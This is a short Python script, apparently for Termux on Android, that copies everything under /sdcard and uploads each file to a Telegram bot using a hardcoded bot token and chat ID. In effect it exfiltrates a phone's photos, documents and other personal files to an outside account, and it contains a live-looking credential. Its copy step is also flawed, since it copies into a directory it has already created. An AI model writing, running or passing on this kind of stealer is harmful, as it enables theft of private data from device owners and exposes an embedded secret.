import os
import shutil
from telegram import Bot
from telegram import InputFile

def send_files(bot_token, chat_id, files_directory):
    bot = Bot(token=bot_token)
    
    for root, dirs, files in os.walk(files_directory):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as file_obj:
                bot.send_document(chat_id=chat_id, document=InputFile(file_obj))
    
    print('Files sent successfully!')

# Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with the actual values
bot_token = '6932622383:AAHJ4CrKvQaZjlmnJ2Dw4gAgZTiEwuJLlBU'
chat_id = '6518876265'
sdcard_directory = '/sdcard'

# Create a temporary directory in Termux to avoid permission issues
termux_temp_directory = '/data/data/com.termux/files/home/temp'
os.makedirs(termux_temp_directory, exist_ok=True)

# Copy files from sdcard to the temporary directory
shutil.copytree(sdcard_directory, termux_temp_directory)

# Send files to the Telegram bot
send_files(bot_token, chat_id, termux_temp_directory)

# Clean up the temporary directory
shutil.rmtree(termux_temp_directory)
